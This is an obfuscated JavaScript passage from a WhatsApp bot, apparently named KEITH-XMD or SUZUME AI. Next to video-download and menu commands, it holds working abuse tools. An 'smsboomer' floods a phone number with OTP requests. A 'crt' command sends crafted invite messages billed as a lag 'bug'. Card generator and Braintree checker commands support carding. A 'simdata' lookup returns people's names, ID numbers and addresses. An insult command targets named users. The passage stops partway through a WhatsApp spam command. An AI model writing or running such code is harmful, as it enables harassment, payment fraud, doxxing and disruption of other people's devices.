            _0x466d97 = _0x3072e9.message.extendedTextMessage.contextInfo.participant;
            if (!_0x473e2c && _0x3072e9.message.extendedTextMessage.contextInfo.quotedMessage.conversation) {
              _0x473e2c = _0x3072e9.message.extendedTextMessage.contextInfo.quotedMessage.conversation.trim();
            }
          }
          if (!_0x473e2c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <Facebook URL>\nExample: " + (_0x2c0185 + _0x17343c) + " https://fb.watch/xyz\nOr reply to a message containing a Facebook URL with .fb");
          }
          if (!_0x473e2c.includes("facebook.com") && !_0x473e2c.includes("fb.watch")) {
            return _0x4e7dbf("❌ Invalid URL - Must be from Facebook (facebook.com or fb.watch)");
          }
          try {
            await _0x4e7dbf("⏳ Processing your Facebook video...");
            const _0x310ae9 = "https://tcs-demonic2.vercel.app/api/fbdownloader?url=" + encodeURIComponent(_0x473e2c);
            const _0xf66b65 = await fetch(_0x310ae9);
            const _0x52294c = await _0xf66b65.json();
            if (!_0x52294c.success || !_0x52294c.data.success) {
              throw new Error(_0x52294c.message || "Failed to fetch video links.");
            }
            const {
              hdlink: _0x2445b5,
              sdlink: _0x4ea80b
            } = _0x52294c.data;
            let _0x10999f = _0x2445b5 || _0x4ea80b;
            if (_0x10999f) {
              const _0x288481 = await fetch(_0x10999f);
              const _0x599e7e = Buffer.from(await _0x288481.arrayBuffer());
              const _0x291218 = _0x599e7e.length / 1048576;
              if (_0x291218 <= 100) {
                await _0x4afd02.sendMessage(_0x3072e9.chat, {
                  video: _0x599e7e,
                  caption: "🎥 *Facebook Video Downloaded!*\nQuality: " + (_0x2445b5 ? "HD" : "SD") + "\nURL: " + _0x473e2c,
                  contextInfo: {
                    mentionedJid: _0x466d97 ? [_0x466d97, _0x3072e9.sender] : [_0x3072e9.sender],
                    forwardedNewsletterMessageInfo: {
                      newsletterName: "SUZUME AI",
                      newsletterJid: "120363401903613460@newsletter"
                    },
                    isForwarded: true,
                    externalAdReply: {
                      title: "SUZUME-AI 🚀|best w.a bot ever. add trackip address,waspam,bug and lot more by Mr Ntando Ofc",
                      thumbnailUrl: "https://i.ibb.co/ynsXpNwM/suzume-ai-jpg.jpg",
                      sourceUrl: "https://whatsapp.com/channel/0029VbAhndjKLaHneeiTAy3J"
                    }
                  }
                }, {
                  quoted: _0x3072e9
                });
              } else {
                let _0x336a5f = "⚠ Video too large to send (" + _0x291218.toFixed(2) + " MB)!\n\n🎥 *Facebook Video Links:*\n";
                if (_0x2445b5) {
                  _0x336a5f += "📽 *HD*: " + _0x2445b5 + "\n";
                }
                if (_0x4ea80b) {
                  _0x336a5f += "📽 *SD*: " + _0x4ea80b + "\n";
                }
                _0x336a5f += "\nURL: " + _0x473e2c;
                await _0x4e7dbf(_0x336a5f);
              }
            } else {
              throw new Error("No video links available.");
            }
            await _0x4e7dbf("✅ Video processed successfully!");
          } catch (_0x28d55e) {
            console.error("FB Downloader Error:", _0x28d55e);
            await _0x4e7dbf("❌ *Error:* " + (_0x28d55e.message || "Failed to download video. Please try again."));
          }
        }
        break;
      case "gli":
        {
          const _0x51529b = ["*rishi* Bkl mkc gando lory 6ky ✒️chod", "*rishi* Gndu Bkl Dala Bc Mc Mkc Bhawa Lusi Kaner L8a", "*rishi* Bc mc gandu king 6ky ✒️", "*rishi* Ullu ka pattha 360 🦉"];
          try {
            const _0x588e3c = _0x51529b[Math.floor(Math.random() * _0x51529b.length)];
            await _0x5c1285(_0x588e3c);
          } catch (_0x1b5c07) {
            console.error("Gali Command Error:", _0x1b5c07);
            await _0x4e7dbf("⚠ *Error:* " + _0x1b5c07.message);
          }
        }
        break;
      case "gali":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ abu ko gali 😂");
          }
          const _0x12fd92 = ["263771629199@s.whatsapp.net", "263777124998@s.whatsapp.net"];
          const _0x4b21c6 = ["ntando", "light", "ntandoofc", "lightmaker"];
          const _0x331ade = ["Bkl mkc gando lory 6ky ✒️chod", "Gndu Bkl Dala Bc Mc Mkc Bhawa Lusi Kaner L8a", "Bc mc gandu king 6ky ✒️", "Ullu ka pattha 360 🦉"];
          let _0x162fa1 = _0x4d841c.trim();
          let _0x5c8143 = null;
          if (_0x3072e9.message?.extendedTextMessage?.contextInfo?.quotedMessage && _0x3072e9.key.remoteJid.endsWith("@g.us")) {
            _0x5c8143 = _0x3072e9.message.extendedTextMessage.contextInfo.participant;
            if (!_0x162fa1) {
              _0x162fa1 = (await _0x4afd02.getName(_0x5c8143)) || _0x5c8143.split("@")[0];
            }
          } else if (!_0x162fa1) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " <name>\nExample: " + (_0x2c0185 + _0x17343c) + " rishi\nOr reply to a message in a group with .gali");
          }
          const _0x1facf5 = _0x3047a3 => {
            const _0x5ccc75 = {
              𝗔: "A",
              𝗕: "B",
              𝗖: "C",
              𝗗: "D",
              𝗘: "E",
              𝗙: "F",
              𝗚: "G",
              𝗛: "H",
              𝗜: "I",
              𝗝: "J",
              𝗞: "K",
              𝗟: "L",
              𝗠: "M",
              𝗡: "N",
              𝗢: "O",
              𝗣: "P",
              𝗤: "Q",
              𝗥: "R",
              𝗦: "S",
              𝗧: "T",
              𝗨: "U",
              𝗩: "V",
              𝗪: "W",
              𝗫: "X",
              𝗬: "Y",
              𝗭: "Z",
              𝗮: "a",
              𝗯: "b",
              𝗰: "c",
              𝗱: "d",
              𝗲: "e",
              𝗳: "f",
              𝗴: "g",
              𝗵: "h",
              𝗶: "i",
              𝗷: "j",
              𝗸: "k",
              𝗹: "l",
              𝗺: "m",
              𝗻: "n",
              𝗼: "o",
              𝗽: "p",
              𝗾: "q",
              𝗿: "r",
              𝘀: "s",
              𝘁: "t",
              𝘂: "u",
              𝘃: "v",
              𝘄: "w",
              𝘅: "x",
              𝘆: "y",
              𝘇: "z",
              𝐀: "A",
              𝐁: "B",
              𝐂: "C",
              𝐃: "D",
              𝐄: "E",
              𝐅: "F",
              𝐆: "G",
              𝐇: "H",
              𝐈: "I",
              𝐉: "J",
              𝐊: "K",
              𝐋: "L",
              𝐌: "M",
              𝐍: "N",
              𝐎: "O",
              𝐏: "P",
              𝐐: "Q",
              𝐑: "R",
              𝐒: "S",
              𝐓: "T",
              𝐔: "U",
              𝐕: "V",
              𝐖: "W",
              𝐗: "X",
              𝐘: "Y",
              𝐙: "Z",
              𝐚: "a",
              𝐛: "b",
              𝐜: "c",
              𝐝: "d",
              𝐞: "e",
              𝐟: "f",
              𝐠: "g",
              𝐡: "h",
              𝐢: "i",
              𝐣: "j",
              𝐤: "k",
              𝐥: "l",
              𝐦: "m",
              𝐧: "n",
              𝐨: "o",
              𝐩: "p",
              𝐪: "q",
              𝐫: "r",
              𝐬: "s",
              𝐭: "t",
              𝐮: "u",
              𝐯: "v",
              𝐰: "w",
              𝐱: "x",
              𝐲: "y",
              𝐳: "z",
              𝔸: "A",
              𝔹: "B",
              ℂ: "C",
              𝔻: "D",
              𝔼: "E",
              𝔽: "F",
              𝔾: "G",
              ℍ: "H",
              𝕀: "I",
              𝕁: "J",
              𝕂: "K",
              𝕃: "L",
              𝕄: "M",
              ℕ: "N",
              𝕆: "O",
              ℙ: "P",
              ℚ: "Q",
              ℝ: "R",
              𝕊: "S",
              𝕋: "T",
              𝕌: "U",
              𝕍: "V",
              𝕎: "W",
              𝕏: "X",
              𝕐: "Y",
              ℤ: "Z",
              𝕒: "a",
              𝕓: "b",
              𝕔: "c",
              𝕕: "d",
              𝕖: "e",
              𝕗: "f",
              𝕘: "g",
              𝕙: "h",
              𝕚: "i",
              𝕛: "j",
              𝕜: "k",
              𝕝: "l",
              𝕞: "m",
              𝕟: "n",
              𝕠: "o",
              𝕡: "p",
              𝕢: "q",
              𝕣: "r",
              𝕤: "s",
              𝕥: "t",
              𝕦: "u",
              𝕧: "v",
              𝕨: "w",
              𝕩: "x",
              𝕪: "y",
              𝕫: "z"
            };
            return _0x3047a3.replace(/[\u{1D400}-\u{1D7FF}]/gu, _0x62317c => _0x5ccc75[_0x62317c] || _0x62317c);
          };
          const _0x329c81 = _0x1facf5(_0x162fa1).replace(/[\*_"'`\[\]\(\)\{\}]/g, "").trim();
          let _0x3e09e7 = _0x5c8143 || (_0x329c81.match(/^\d+$/) ? _0x329c81 + "@s.whatsapp.net" : null);
          try {
            if (_0x3e09e7) {
              if (_0x2616e7(_0x3e09e7)) {
                return _0x4e7dbf("❌ Cannot use .gali on the owner! 😎");
              }
              if (_0x12fd92.includes(_0x3e09e7)) {
                return _0x4e7dbf("❌ Cannot use .gali on a prime user! 🌟");
              }
            }
            const _0x4760aa = _0x329c81.split(/\s+/);
            const _0x123736 = _0x4760aa.some(_0x41e454 => _0x4b21c6.some(_0x61c3dc => _0x41e454.toLowerCase().includes(_0x61c3dc.toLowerCase())));
            if (_0x123736) {
              return _0x4e7dbf("❌ Cannot use .gali on restricted names! 🚫");
            }
            const _0xf5eebe = _0x162fa1 + " " + _0x331ade[Math.floor(Math.random() * _0x331ade.length)];
            if (_0x5c8143) {
              await _0x4afd02.sendMessage(_0x3072e9.key.remoteJid, {
                text: "@" + _0x5c8143.split("@")[0] + " " + _0xf5eebe,
                mentions: [_0x5c8143]
              }, {
                quoted: _0x3072e9
              });
            } else {
              await _0x4e7dbf(_0xf5eebe);
            }
          } catch (_0x1014d4) {
            console.error("Gali Command Error:", _0x1014d4);
            _0x4e7dbf("⚠ *Error:* " + _0x1014d4.message);
          }
        }
        break;
      case "checkhost":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 *Usage:* " + (_0x2c0185 + _0x17343c) + " https://example.com");
          }
          if (!_0x54ede9(_0x4d841c)) {
            return _0x4e7dbf("❌ *Invalid URL!* Please provide a valid website link (e.g., https://example.com)");
          }
          let _0x4d2ad6 = {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    title: "🌐 Host Checker",
                    subtitle: ""
                  },
                  body: {
                    text: "Click the button below to check the host status."
                  },
                  footer: {
                    text: global.namaBot
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "Check Host",
                        url: "https://check-host.net/check-http?host=" + encodeURIComponent(_0x4d841c),
                        merchant_url: "https://check-host.net/check-http?host=" + encodeURIComponent(_0x4d841c)
                      })
                    }],
                    messageParamsJson: ""
                  }
                }
              }
            }
          };
          await _0x4afd02.relayMessage(_0x3072e9.chat, _0x4d2ad6, {
            messageId: _0x3072e9.key.id
          });
        }
        break;
      case "infomenu":
        {
          _0x5f1fdc("\n▰▰▰▱▱▱▱▱▱▱ \n╭─────────────···◈  \n╭━〔 🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 〕━╮   \n┃ 🤖 *Bot Name:* " + global.namaBot + "\n┃ 👤 *User:* " + _0x24e7b9 + "  \n┃ 🤖 *Type:* AI  \n┃ 🔢 *Version:* " + global.versionBot + "	\n┃ 🧑‍💻 *Dev:* " + global.namaDeveloper + " \n╰━━━━━━━━━━━━━━━━━━╯  \n╭─〔DEV DETAILS〕────╮	\n┃ 😎 *Status:* " + (!_0x2616e7(_0x3072e9.sender) ? "User ⭐" : "Developer ⭐") + "\n┃ 🎊 *Premium:* " + (_0xe666ea ? "✅" : "❎") + "\n╰────────────────────────╯	\n╭───⌈ 😊Hello 👋, my friend! hope you enjoy the ride ⌋───╮   \n * KEITH XMD- M E N U *\n   \n╭─〔 *`🧑‍💻KEITH XMD OWNER🧑‍💻`* 〕────╮\n*┋* *⬡ .clean*\n*┋* *⬡ .getsc*\n│ *⬡ .addprem*\n*┋* *⬡ .delprem*  \n*┋* *⬡ . addowner*\n*┋* *⬡ .removeowner*\n*┋* *⬡ .suzume-ai* ( on/off )\n╰────────────────────────╯\n╭─〔 *`📠KEITH-XMD DATABASE📠`* 〕────╮  \n*┋* *⬡ .simdata* ( number )\n╰────────────────────────╯\n╭─〔 *`🚫KEITH-XMD SMS BOOMER🚫`* 〕────╮\n*┋* *⬡ .waspam* ( 263xxx )\n*┋* *⬡ .smsboomber* ( 263xxx 𝟏-𝟎𝟎 )\n╰────────────────────────╯		*\n╭─〔 *`💻KEITH-XMD TOOLS💻`* 〕────╮\n*┋* *⬡ .checkcc* ( Card ) \n*┋* ✇ *⬡ .gen* ( bin )\n╰─────────────╶╶···◈*\n┌── [ *`🖥️SUZUME AI TOOLS🖥️`* ]\n*┋* *⬡ . webcopy* ( url 🔗 )\n*┋* *⬡ .ai* ( text )\n│ *⬡ .tourl* ( reply img )\n*┋* *⬡ .shorturl* ( url 🔗 )\n*┋* *⬡ .trackip* ( 173.255.160.70 )\n*┋* *⬡ .checkhost* ( url 🔗 )\n*┋* *⬡ .enc doc* ( reply js script )\n*┋* *⬡ .dec doc* ( reply js script )\n╰─────────────╶╶···◈*\n╭─〔 *`⚠️KEITH-XMD ⚠️`* 〕────╮\n*┋* *⬡ .bug* ( 923xxx )\n*┋* *⬡ .crt* ( group link )\n╰────────────────────────╯\n╭─〔 *`📤KEITH-XMD DOWNLOADER📥`* 〕────╮\n*┋* *⬡ .splay* ( song name )\n*┋* *⬡ .tt* ( TikTok 🔗 )\n*┋* *⬡ .fb* ( Facebook 🔗 )\n*┋* *⬡ .ig* ( Instagram 🔗 )\n╰────────────────────────╯\n    ");
          await _0x4afd02.sendMessage(_0x3072e9.chat, {
            audio: _0x3c1bab,
            mimetype: "audio/mpeg",
            ptt: true
          }, {
            quoted: _0x3072e9
          });
        }
        break;
       case "menu":
        {
          _0x5f1fdc("\n▰▰▰▱▱▱▱▱▱▱ \n╭─────────────···◈  \n╭━〔 🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢 〕━╮   \n┃ 🤖 *Bot Name:* " + global.namaBot + "\n┃ 👤 *User:* " + _0x24e7b9 + "  \n┃ 🤖 *Type:* AI  \n┃ 🔢 *Version:* " + global.versionBot + "	\n┃ 🧑‍💻 *Dev:* " + global.namaDeveloper + " \n╰━━━━━━━━━━━━━━━━━━╯  \n╭─〔DEV DETAILS〕────╮	\n┃ 😎 *Status:* " + (!_0x2616e7(_0x3072e9.sender) ? "User ⭐" : "Developer ⭐") + "\n┃ 🎊 *Premium:* " + (_0xe666ea ? "✅" : "❎") + "\n╰────────────────────────╯\n    ");
          await _0x4afd02.sendMessage(_0x3072e9.chat, {
            audio: _0x3c1bab,
            mimetype: "audio/mpeg",
            ptt: true
          }, {
            quoted: _0x3072e9
          });
        }
        break;
      case "keithai":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (_0x4d841c === "on") {
            aiMode = true;
            return _0x4e7dbf("✅ *AI Mode Activated!* 🤖\nNow I will reply to every message.");
          }
          if (_0x4d841c === "off") {
            aiMode = false;
            return _0x4e7dbf("❌ *AI Mode Deactivated!* 🚫\nI will stop replying automatically.");
          }
          return _0x4e7dbf("📌 *Usage:*\n.keith-ai on\n.keith off");
        }
        break;
      case "addowner":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (!_0xf66042[0]) {
            return _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "📌 *example: \n `.addowner 26378xxx`)"
            }, {
              quoted: _0x3072e9
            });
          }
          let _0x520697 = _0x4d841c.replace(/\D/g, "") + "@s.whatsapp.net";
          let _0x2dc737 = _0x5306fe();
          if (_0x2dc737.includes(_0x520697)) {
            return _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "✅ *This number is already an Owner!*"
            }, {
              quoted: _0x3072e9
            });
          }
          _0x2dc737.push(_0x520697);
          _0x3f183a(_0x2dc737);
          _0x4afd02.sendMessage(_0x3072e9.chat, {
            text: "🎉 *Successfully added new Owner: " + _0x520697 + "*"
          }, {
            quoted: _0x3072e9
          });
        }
        break;
      case "removeowner":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (!_0xf66042[0]) {
            return _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "📌 *example: \n `.removeowner 263771639199`)"
            }, {
              quoted: _0x3072e9
            });
          }
          let _0x39f0ee = _0x4d841c.replace(/\D/g, "") + "@s.whatsapp.net";
          let _0x412f6f = _0x5306fe();
          if (!_0x412f6f.includes(_0x39f0ee)) {
            return _0x4afd02.sendMessage(_0x3072e9.chat, {
              text: "❌ *This number is not an Owner!*"
            }, {
              quoted: _0x3072e9
            });
          }
          _0x412f6f = _0x412f6f.filter(_0x8ae66e => _0x8ae66e !== _0x39f0ee);
          _0x3f183a(_0x412f6f);
          _0x4afd02.sendMessage(_0x3072e9.chat, {
            text: "🗑 *Successfully removed Owner: " + _0x39f0ee + "*"
          }, {
            quoted: _0x3072e9
          });
        }
        break;
      case "crt":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          if (!_0xf66042[0]) {
            return _0x3072e9.reply("Usage: " + (_0x2c0185 + _0x17343c) + " Link\nExample: " + (_0x2c0185 + _0x17343c) + " https://whatsapp.com/channel/0029Vb4yAGGIHphBnp4jaj2A");
          }
          let _0x285ded = _0xf66042[0].split("https://chat.whatsapp.com/")[1];
          let _0x11f109 = await _0x4afd02.groupAcceptInvite(_0x285ded);
          jumlah = "3";
          for (let _0xb71044 = 0; _0xb71044 < jumlah; _0xb71044++) {
            var _0x2793f4 = generateWAMessageFromContent(_0x5616f8, proto.Message.fromObject({
              groupInviteMessage: {
                groupJid: "120363318668586386@g.us",
                inviteCode: "/RwWifkIpEQUesVv",
                inviteExpiration: "1709614188",
                groupName: "" + _0x4f0ce5,
                caption: "Yahaha Lag Ya?!"
              }
            }), {
              userJid: _0x5616f8,
              quoted: _0x3072e9
            });
            _0x4afd02.relayMessage(_0x11f109, _0x2793f4.message, {
              messageId: _0x2793f4.key.id
            });
          }
          _0x3072e9.reply("✅ Successfully sent the bug!\n\n🔹 *Credit: Keith-Tech*");
        }
        break;
      case "b3chk":
      case "chkcc":
      case "b3":
        {
          if (!_0x4d841c) {
            return _0x3072e9.reply("📌 *Provide a CC in the format:*\n`4147768576029506|11|2025|153`");
          }
          try {
            let _0xe3f344 = await _0x3072e9.reply("⏳ *Checking card status... Please wait.*");
            const _0x5ac9bc = await axios.get("https://fam-official.serv00.net/sim/b3.php?famcc=" + encodeURIComponent(_0x4d841c));
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              delete: _0xe3f344.key
            });
            if (_0x5ac9bc.data.status === "success") {
              let _0xefb65e = _0x5ac9bc.data.bin_info;
              let _0x4a0449 = _0x5ac9bc.data.cc_status;
              let _0x5ee874 = _0x5ac9bc.data.response_message;
              let _0x560e38 = "🎩 by Keith-Tech\n 𝐁𝐚𝐢𝐧𝐭𝐫𝐞𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫*\n\n";
              _0x560e38 += "💳 *Card:* " + _0x5ac9bc.data.card + "\n";
              _0x560e38 += "🌍 *Gateway:* " + _0x5ac9bc.data.gateway + "\n";
              _0x560e38 += "📌 *Status:* " + _0x4a0449 + "\n";
              _0x560e38 += "📢 *Response:* " + _0x5ee874 + "\n\n";
              _0x560e38 += "🏦 *Bank:* " + _0xefb65e.bank + "\n";
              _0x560e38 += "🌍 *Country:* " + _0xefb65e.country + " " + _0xefb65e.emoji + "\n";
              _0x560e38 += "💳 *Brand:* " + _0xefb65e.brand + "\n";
              _0x560e38 += "🔍 *Scheme:* " + _0xefb65e.scheme + "\n";
              _0x560e38 += "📌 *Type:* " + _0xefb65e.type + "\n\n";
              _0x560e38 += "🚀 *Powered by KEITH-XMD*\n";
              let _0xbf2631 = _0x4a0449.includes("Approved") ? "https://fam-official.serv00.net/script12/fampng/approved.png" : "https://fam-official.serv00.net/script12/fampng/declined.png";
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                image: {
                  url: _0xbf2631
                },
                caption: _0x560e38
              });
            } else {
              _0x3072e9.reply("⚠ *Failed to check card. Try again with a valid CC.*");
            }
          } catch (_0x36b34c) {
            console.error("API Error:", _0x36b34c);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              delete: loadingMessage.key
            });
            _0x3072e9.reply("⚠ *Error checking card. Try again later.*");
          }
        }
        break;
      case "clean":
        {
          if (!_0x2616e7(_0x5c56de)) {
            return _0x4e7dbf("❌ Only the Owner can use this command!");
          }
          try {
            let _0x13d902 = "./session";
            let _0x4d2181 = "creds.json";
            let _0x22804d = await _0x4e7dbf("⏳ *Cleaning session files... Please wait.*");
            const _0x26cb07 = require("fs");
            const _0x43c3ca = require("path");
            if (_0x26cb07.existsSync(_0x13d902)) {
              let _0x3cf08f = _0x26cb07.readdirSync(_0x13d902);
              let _0x5d4024 = 0;
              for (let _0x1fa74f of _0x3cf08f) {
                let _0x372552 = _0x43c3ca.join(_0x13d902, _0x1fa74f);
                if (_0x26cb07.lstatSync(_0x372552).isFile() && _0x1fa74f !== _0x4d2181) {
                  _0x26cb07.unlinkSync(_0x372552);
                  _0x5d4024++;
                }
              }
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                delete: _0x22804d.key
              });
              _0x4e7dbf("✅ *Successfully deleted " + _0x5d4024 + " session files!*\n⚠ *creds.json is kept safe.*");
            } else {
              _0x4e7dbf("❌ *Session folder not found!*");
            }
          } catch (_0x51b8ca) {
            console.error("Error Cleaning Sessions:", _0x51b8ca);
            _0x4e7dbf("⚠ *Error cleaning session files. Try again later.*");
          }
        }
        break;
      case "runtime":
      case "ping":
        {
          let _0x316f52 = _0x4d5463(process.uptime());
          let _0x39276b = await _0x404300();
          let _0x40eaf6 = "\n〔 *KEITH-XMD🚀 STATUS* 〕\n*┋*⏳ *Uptime:* " + _0x316f52 + "\n│⚡ *Ping:* " + _0x39276b + "\n*┋*   by KEITH-XMD🚀\n╰─────────────╶╶···◈*\n    ";
          _0x4e7dbf(_0x40eaf6);
        }
        break;
      case "dev":
      case "developer":
        {
          let _0x5d5ee9 = "\n┌─〔 *KEITH-XMD🚀- INFO* 〕\n*┋*  \n*┋* 🔴 *YouTube:* [@Kayboy154]  \n*┋* 🔵 *Telegram:* [Join Now](https://t.me/Kayboy15)  \n*┋* 🟢 *WhatsApp Channel:* [Click Here](https://whatsapp.com/channel/0029Vb4yAGGIHphBnp4jaj2A)  \n*┋*  \n*┋* 🌐 *Website:* [Visit Now](https://ntandoofc-api.vercel.app/)  \n*┋* 📸 *Instagram:* [@mrntando_ofc]  \n*┋* 🐙 *GitHub:* [mrntandooofc]  \n*┋* 💬 *WhatsApp:* [+263771629199]  \nby KEITH-XMD🚀\n╰─────────────╶╶···◈*\n\n    ";
          _0x4e7dbf(_0x5d5ee9);
        }
        break;
      case "keith":
        {
          let _0x591ac1 = "\n┌─〔 *KEITH-XMD* 〕\n│\n│🔴 *YouTube* https://youtube.com/@mrntandoofc\n│\n└───────────────\n    ";
          _0x4e7dbf(_0x591ac1);
        }
        break;
      case "gen":
      case "ccgen":
      case "gencc":
        {
          if (!_0x4d841c) {
            return _0x3072e9.reply("📌 *Provide a BIN (First 6 digits)*\nExample: `.gen 550989`");
          }
          try {
            let _0x29988a = await _0x3072e9.reply("⏳ *Generating cards... Please wait.*");
            const _0xe6791c = await axios.get("https://fam-official.serv00.net/sim/famccgen.php?cc=" + encodeURIComponent(_0x4d841c));
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              delete: _0x29988a.key
            });
            if (_0xe6791c.data.status === "success" && _0xe6791c.data.generated_cards.length > 0) {
              let _0x8c28c5 = _0xe6791c.data.generated_cards;
              let _0x30eb4c = _0xe6791c.data.bin_info;
              let _0x546c78 = _0x8c28c5.join("\n");
              let _0x4f7c13 = "🎩 *SUZUME AI🚀- 𝐂𝐂 𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑*\n\n";
              _0x4f7c13 += "🔢 *BIN:* " + _0x4d841c + "xxxxx\n";
              _0x4f7c13 += "🏦 *Bank:* " + _0x30eb4c.bank + "\n";
              _0x4f7c13 += "🌍 *Country:* " + _0x30eb4c.country + " " + _0x30eb4c.emoji + "\n";
              _0x4f7c13 += "💳 *Brand:* " + _0x30eb4c.brand + "\n";
              _0x4f7c13 += "🔍 *Scheme:* " + _0x30eb4c.scheme + "\n";
              _0x4f7c13 += "📌 *Type:* " + _0x30eb4c.type + "\n";
              _0x4f7c13 += "💰 *Currency:* " + _0x30eb4c.currency + "\n\n";
              _0x4f7c13 += "🚀 *Powered BY KEITH-TECH*";
              const _0x518583 = "https://fam-official.serv00.net/script12/fampng/Famccgen.png";
              let _0x1179f2 = generateWAMessageFromContent(_0x3072e9.chat, {
                viewOnceMessage: {
                  message: {
                    interactiveMessage: {
                      body: {
                        text: _0x4f7c13
                      },
                      carouselMessage: {
                        cards: [{
                          header: {
                            imageMessage: (await generateWAMessageContent({
                              image: {
                                url: _0x518583
                              }
                            }, {
                              upload: _0x4afd02.waUploadToServer
                            })).imageMessage,
                            hasMediaAttachment: true
                          },
                          body: {
                            text: "🔢 *Generated Cards:*\n```" + _0x546c78 + "```"
                          },
                          nativeFlowMessage: {
                            buttons: [{
                              name: "cta_copy",
                              buttonParamsJson: "{\"display_text\":\"📋 Copy CCs\",\"copy_code\":\"" + _0x546c78 + "\"}"
                            }]
                          }
                        }],
                        messageVersion: 1
                      }
                    }
                  }
                }
              }, {});
              await _0x4afd02.relayMessage(_0x1179f2.key.remoteJid, _0x1179f2.message, {
                messageId: _0x1179f2.key.id
              });
            } else {
              _0x3072e9.reply("⚠ *Failed to generate cards. Try again with a valid BIN.*");
            }
          } catch (_0x1dcb81) {
            console.error("API Error:", _0x1dcb81);
            await _0x4afd02.sendMessage(_0x3072e9.chat, {
              delete: loadingMessage.key
            });
            _0x3072e9.reply("⚠ *Error generating cards. Try again later.*");
          }
        }
        break;
      case "smsboomer":
        {
          if (!_0xe666ea) {
            return _0x4e7dbf("only used a premium user");
          }
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 Provide a phone number and sms amount\nExample: .smsboomer 26377199XXX 1-100");
          }
          let _0x4b056a = _0x4d841c.split(" ");
          if (_0x4b056a.length !== 2) {
            return _0x4e7dbf("📌 Invalid format! Use: .smsboomer <phone_number> <count>");
          }
          let _0x4229d1 = _0x4b056a[0];
          let _0x845593 = parseInt(_0x4b056a[1]);
          if (!_0x4229d1 || isNaN(_0x845593) || _0x845593 < 1 || _0x845593 > 100) {
            return _0x4e7dbf("⚠ Enter a valid phone number and OTP count (1-100).");
          }
          _0x4e7dbf("⏳ Sending OTPs...");
          try {
            let _0x51cf19 = [];
            for (let _0x1c9d4f = 0; _0x1c9d4f < _0x845593; _0x1c9d4f++) {
              let _0x3be552 = _0x1c9d4f % 2 === 0 ? "https://bajao.pk/api/v2/login/generatePin?uuid=" + _0x4229d1 : "https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage";
              let _0x2ddccf = _0x1c9d4f % 2 !== 0 ? JSON.stringify({
                Version: "V1",
                Language: "en",
                Platform: "web",
                ProductId: 1733,
                MobileNo: _0x4229d1,
                OperatorId: "100007",
                URL: "https://www.tapmad.com/sign-up",
                source: "organic",
                medium: "organic"
              }) : null;
              let _0x50d9ea = {
                method: "POST",
                headers: _0x1c9d4f % 2 !== 0 ? {
                  "Content-Type": "application/json",
                  Accept: "application/json"
                } : {},
                body: _0x2ddccf
              };
              _0x51cf19.push(fetch(_0x3be552, _0x50d9ea));
            }
            await Promise.all(_0x51cf19);
            _0x4e7dbf("✅ OTP(s) sent successfully!");
          } catch (_0x7d4fe0) {
            console.error("API Error:", _0x7d4fe0);
            _0x4e7dbf("⚠ Error sending OTPs. Try again later.");
          }
        }
        break;
      case "simdata":
        {
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 Provide a phone number or CNIC!\nExample: simdata 03xxx");
          }
          try {
            const _0x3ed759 = await axios.get("https://fam-official.serv00.net/sim/api.php?num=" + encodeURIComponent(_0x4d841c));
            if (_0x3ed759.data && _0x3ed759.data.status === "success" && _0x3ed759.data.data.length > 0) {
              let _0x58a943 = "📋 *`KEITH-XMD 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄`*\n\n";
              _0x3ed759.data.data.forEach((_0x17f212, _0x113af9) => {
                _0x58a943 += "📌 *Record " + (_0x113af9 + 1) + ":*\n";
                _0x58a943 += "🔹 *Name:* " + _0x17f212.Name + "\n";
                _0x58a943 += "🔹 *Mobile:* " + _0x17f212.Mobile + "\n";
                _0x58a943 += "🔹 *CNIC:* " + _0x17f212.CNIC + "\n";
                _0x58a943 += "🔹 *Operator:* " + _0x17f212.Operator + "\n";
                _0x58a943 += "🔹 *Address:* " + (_0x17f212.Address.trim() || "Not Available") + "\n";
                _0x58a943 += "━━━━━━━━━━━━━━━\n";
              });
              await _0x4afd02.sendMessage(_0x3072e9.chat, {
                text: _0x58a943
              }, {
                quoted: _0x3072e9
              });
            } else {
              _0x4e7dbf("⚠ No data found for the provided number. Please check the input and try again.");
            }
          } catch (_0x17fd63) {
            console.error("API Error:", _0x17fd63);
            _0x4e7dbf("⚠ Error fetching data. Try again later.");
          }
        }
        break;
      case "waspam":
        {
          if (!_0xe666ea) {
            return _0x4e7dbf("only used a premium user");
          }
          if (!_0x4d841c) {
            return _0x4e7dbf("📌 Provide a phone number!\nExample: 5093802xxx");
          }
          try {
            _0x4e7dbf("✅ Sending...");
            const _0x11dcf2 = encodeURIComponent(_0x4d841c);
